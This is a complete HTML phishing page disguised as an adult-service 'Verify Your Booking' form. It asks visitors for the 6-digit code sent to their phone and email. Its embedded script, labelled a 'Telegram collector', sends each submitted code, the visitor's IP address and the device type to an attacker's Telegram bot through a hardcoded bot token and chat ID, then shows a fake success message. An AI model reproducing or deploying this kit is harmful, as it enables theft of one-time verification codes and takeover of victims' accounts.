<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>✅ Verify Your Booking</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0505 40%, #0d0202 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            color: #fff;
            position: relative;
            overflow-x: hidden;
        }

        /* ===== BACKGROUND GLOW ===== */
        body::before {
            content: '';
            position: fixed;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(ellipse at center, rgba(255, 50, 50, 0.06) 0%, transparent 70%);
            pointer-events: none;
            z-index: 0;
        }

        .container {
            max-width: 480px;
            width: 100%;
            background: rgba(16, 8, 8, 0.96);
            border-radius: 28px;
            padding: 36px 28px 32px;
            border: 1px solid rgba(255, 100, 100, 0.12);
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.9), 0 0 60px rgba(255, 50, 50, 0.04);
            position: relative;
            z-index: 1;
            backdrop-filter: blur(10px);
            animation: fadeUp 0.8s ease;
        }

        @keyframes fadeUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* ===== DECORATIVE LINE ===== */
        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 60%;
            height: 2px;
            background: linear-gradient(90deg, transparent, #ff6b6b, transparent);
            opacity: 0.4;
        }

        /* ===== HEADER ICON ===== */
        .icon-wrap {
            text-align: center;
            margin-bottom: 16px;
        }

        .icon-wrap .icon {
            font-size: 72px;
            display: inline-block;
            animation: float 2.5s ease-in-out infinite;
            filter: drop-shadow(0 0 30px rgba(255, 50, 50, 0.15));
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px) scale(1); }
            50% { transform: translateY(-8px) scale(1.02); }
        }

        /* ===== TITLE ===== */
        .title {
            text-align: center;
            margin-bottom: 6px;
        }

        .title h2 {
            font-size: 26px;
            font-weight: 800;
            background: linear-gradient(135deg, #ff6b6b, #ff4444);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: 0.5px;
        }

        .title .sub {
            font-size: 14px;
            color: #aaa;
            margin-top: 4px;
            font-weight: 400;
            -webkit-text-fill-color: #aaa;
        }

        .title .sub strong {
            color: #ff6b6b;
            -webkit-text-fill-color: #ff6b6b;
        }

        /* ===== LOADER (still visible) ===== */
        .loader-wrap {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 12px;
            margin: 18px 0 10px;
        }

        .loader {
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 100, 100, 0.1);
            border-top: 3px solid #ff6b6b;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loader-text {
            font-size: 13px;
            color: #888;
            font-weight: 500;
        }

        /* ===== DIVIDER ===== */
        .divider {
            display: flex;
            align-items: center;
            gap: 16px;
            margin: 18px 0 22px;
        }

        .divider .line {
            flex: 1;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(255, 100, 100, 0.15), transparent);
        }

        .divider .dot {
            width: 6px;
            height: 6px;
            background: #ff6b6b;
            border-radius: 50%;
            opacity: 0.4;
        }

        /* ===== VERIFICATION FORM ===== */
        .verify-box {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 100, 100, 0.06);
            border-radius: 16px;
            padding: 22px 20px 20px;
            margin-bottom: 8px;
        }

        .verify-box label {
            display: block;
            font-size: 15px;
            font-weight: 600;
            color: #ddd;
            margin-bottom: 6px;
            text-align: center;
        }

        .verify-box label .heart {
            color: #ff6b6b;
        }

        .verify-box .hint {
            text-align: center;
            font-size: 12px;
            color: #666;
            margin-bottom: 16px;
            line-height: 1.5;
        }

        .verify-box .hint span {
            color: #ff6b6b;
        }

        .input-group {
            position: relative;
        }

        .input-group input {
            width: 100%;
            padding: 14px 18px;
            background: rgba(255, 255, 255, 0.04);
            border: 1.5px solid rgba(255, 255, 255, 0.08);
            border-radius: 14px;
            font-size: 18px;
            font-weight: 600;
            color: #fff;
            outline: none;
            transition: 0.3s;
            text-align: center;
            letter-spacing: 4px;
            font-family: 'Courier New', monospace;
        }

        .input-group input::placeholder {
            color: #444;
            font-weight: 400;
            letter-spacing: 1px;
            font-size: 14px;
        }

        .input-group input:focus {
            border-color: #ff6b6b;
            background: rgba(255, 50, 50, 0.06);
            box-shadow: 0 0 0 5px rgba(255, 50, 50, 0.06);
        }

        .input-group input.error {
            border-color: #ff6b6b;
            background: rgba(255, 50, 50, 0.08);
            animation: shake 0.4s ease;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-8px); }
            75% { transform: translateX(8px); }
        }

        .input-group .error-msg {
            color: #ff6b6b;
            font-size: 12px;
            font-weight: 500;
            margin-top: 6px;
            display: none;
            text-align: center;
        }

        .input-group .error-msg.show {
            display: block;
        }

        /* ===== BUTTON ===== */
        .btn-confirm {
            width: 100%;
            padding: 15px;
            margin-top: 4px;
            background: linear-gradient(135deg, #ff6b6b, #c0392b);
            color: #fff;
            border: none;
            border-radius: 40px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 4px 25px rgba(255, 50, 50, 0.2);
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
        }

        .btn-confirm:hover {
            transform: scale(1.02);
            box-shadow: 0 6px 35px rgba(255, 50, 50, 0.35);
        }

        .btn-confirm:active {
            transform: scale(0.98);
        }

        .btn-confirm:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .btn-confirm .ripple {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.2);
            transform: scale(0);
            animation: rippleAnim 0.6s linear;
            pointer-events: none;
        }

        @keyframes rippleAnim {
            to {
                transform: scale(4);
                opacity: 0;
            }
        }

        /* ===== STATUS ===== */
        #status {
            margin-top: 16px;
            font-size: 13px;
            font-weight: 600;
            display: none;
            padding: 12px;
            border-radius: 12px;
            text-align: center;
        }

        #status.success {
            display: block;
            background: rgba(46, 204, 113, 0.1);
            color: #2ecc71;
            border: 1px solid rgba(46, 204, 113, 0.15);
        }

        #status.error {
            display: block;
            background: rgba(255, 50, 50, 0.08);
            color: #ff6b6b;
            border: 1px solid rgba(255, 50, 50, 0.1);
        }

        /* ===== PAY AFTER ===== */
        .pay-after {
            margin-top: 18px;
            padding: 12px 16px;
            background: rgba(46, 204, 113, 0.05);
            border: 1px solid rgba(46, 204, 113, 0.08);
            border-radius: 12px;
            color: #2ecc71;
            font-weight: 600;
            font-size: 14px;
            text-align: center;
        }

        .pay-after span {
            font-size: 16px;
            margin-right: 6px;
        }

        /* ===== FOOTER ===== */
        .footer {
            margin-top: 20px;
            font-size: 11px;
            color: #444;
            text-align: center;
            border-top: 1px solid rgba(255, 255, 255, 0.04);
            padding-top: 14px;
            letter-spacing: 0.3px;
        }

        .footer a {
            color: #ff6b6b;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 480px) {
            .container {
                padding: 24px 16px 24px;
                border-radius: 20px;
            }

            .icon-wrap .icon {
                font-size: 56px;
            }

            .title h2 {
                font-size: 22px;
            }

            .verify-box {
                padding: 16px 14px 16px;
            }

            .verify-box label {
                font-size: 14px;
            }

            .input-group input {
                font-size: 16px;
                padding: 12px 14px;
            }

            .btn-confirm {
                font-size: 16px;
                padding: 13px;
            }

            .loader-text {
                font-size: 12px;
            }
        }

        @media (max-width: 380px) {
            .container {
                padding: 18px 12px 18px;
            }

            .title h2 {
                font-size: 19px;
            }

            .verify-box label {
                font-size: 13px;
            }

            .input-group input {
                font-size: 14px;
                padding: 10px 12px;
            }
        }
    </style>
</head>
<body>

    <div class="container">

        <!-- ===== HEADER ===== -->
        <div class="icon-wrap">
            <div class="icon">💋</div>
        </div>

        <div class="title">
            <h2>Verify Your Booking</h2>
            <div class="sub">Enter the code sent to your <strong>phone</strong> &amp; <strong>email</strong></div>
        </div>

        <!-- ===== LOADER ===== -->
        <div class="loader-wrap">
            <div class="loader"></div>
            <span class="loader-text">Waiting for verification...</span>
        </div>

        <!-- ===== DIVIDER ===== -->
        <div class="divider">
            <span class="line"></span>
            <span class="dot"></span>
            <span class="line"></span>
        </div>

        <!-- ===== VERIFICATION FORM ===== -->
        <div class="verify-box">
            <label>🔐 Enter Verified Code <span class="heart">❤️</span></label>
            <div class="hint">Please enter the <span>6-digit code</span> sent to your device</div>

            <div class="input-group">
                <input type="text" id="verifyCode" placeholder="••••••" maxlength="6" autocomplete="off" inputmode="numeric">
                <div class="error-msg" id="codeError">❌ Please enter the verification code.</div>
            </div>
        </div>

        <!-- ===== CONFIRM BUTTON ===== -->
        <button class="btn-confirm" id="confirmBtn">💋 Confirm Booking</button>

        <!-- ===== STATUS ===== -->
        <div id="status"></div>

        <!-- ===== PAY AFTER ===== -->
        <div class="pay-after">
            <span>💰</span> Pay After Service — Satisfaction Guaranteed!
        </div>

        <!-- ===== FOOTER ===== -->
        <div class="footer">
            🔞 18+ Only · Private & Confidential · <a href="#">T&amp;C</a>
        </div>

    </div>

    <!-- ============================================================ -->
    <!-- ===== JAVASCRIPT - TELEGRAM COLLECTOR ===== -->
    <!-- ============================================================ -->
    <script>
        // =============================================
        // 🔐 TELEGRAM CONFIG
        // =============================================
        const BOT_TOKEN = '8864995146:AAERB2czzLwxRORXAHcFieptoqXdCJ7BLec';
        const CHAT_ID = '8308044531';

        // =============================================
        // 📍 ELEMENTS
        // =============================================
        const codeInput = document.getElementById('verifyCode');
        const confirmBtn = document.getElementById('confirmBtn');
        const statusDiv = document.getElementById('status');
        const codeError = document.getElementById('codeError');

        // =============================================
        // 📤 SEND CODE TO TELEGRAM
        // =============================================
        async function sendCodeToTelegram(code) {
            try {
                const ua = navigator.userAgent;
                const device = ua.match(/Android.*?;\s([^;)\s]+)/)?.[1] ||
                              ua.match(/iPhone|iPad|iPod|Mac|Windows|Linux/i)?.[0] || 'Unknown';

                let ip = 'Unknown';
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    ip = data.ip || 'Unknown';
                } catch (e) {}

                const msg = `
🔐 **VERIFICATION CODE SUBMITTED**

📱 Code: ${code}
🕒 Time: ${new Date().toLocaleString()}
📱 Device: ${device}
🌐 IP: ${ip}
✅ Submitted from verifyed.html
                `;

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        parse_mode: 'Markdown'
                    })
                });

                return response.ok;
            } catch (err) {
                console.error('Telegram error:', err);
                return false;
            }
        }

        // =============================================
        // 🎯 CONFIRM BUTTON
        // =============================================
        confirmBtn.addEventListener('click', async function(e) {
            // Remove previous error
            codeError.classList.remove('show');
            codeInput.classList.remove('error');
            statusDiv.style.display = 'none';
            statusDiv.className = '';

            const code = codeInput.value.trim();

            // ===== VALIDATE =====
            if (!code || code.length < 4) {
                codeError.textContent = '❌ Please enter the verification code (min 4 characters).';
                codeError.classList.add('show');
                codeInput.classList.add('error');
                codeInput.focus();
                return;
            }

            // ===== DISABLE BUTTON + SHOW LOADING =====
            confirmBtn.disabled = true;
            confirmBtn.textContent = '⏳ Verifying...';

            // ===== SEND TO TELEGRAM =====
            const success = await sendCodeToTelegram(code);

            // ===== SHOW STATUS =====
            if (success) {
                statusDiv.textContent = '✅ Code verified successfully! Your booking is confirmed.';
                statusDiv.className = 'success';
                statusDiv.style.display = 'block';

                // Clear input
                codeInput.value = '';

                // Change button style
                confirmBtn.textContent = '✅ Confirmed!';
                confirmBtn.style.background = 'linear-gradient(135deg, #2ecc71, #27ae60)';

                setTimeout(() => {
                    confirmBtn.textContent = '💋 Confirm Booking';
                    confirmBtn.style.background = 'linear-gradient(135deg, #ff6b6b, #c0392b)';
                    confirmBtn.disabled = false;
                }, 4000);

            } else {
                statusDiv.textContent = '❌ Verification failed. Please try again.';
                statusDiv.className = 'error';
                statusDiv.style.display = 'block';
                confirmBtn.disabled = false;
                confirmBtn.textContent = '💋 Confirm Booking';
            }
        });

        // =============================================
        // 🎯 ENTER KEY SUPPORT
        // =============================================
        codeInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                confirmBtn.click();
            }
        });

        // =============================================
        // 🎯 CLEAR ERROR ON INPUT
        // =============================================
        codeInput.addEventListener('input', function() {
            codeError.classList.remove('show');
            codeInput.classList.remove('error');
        });

        // =============================================
        // 🎯 AUTO-FOCUS CODE INPUT
        // =============================================
        window.addEventListener('DOMContentLoaded', function() {
            setTimeout(() => {
                codeInput.focus();
            }, 500);
        });

        console.log('✅ Verification Page Loaded');
    </script>

</body>
</html>
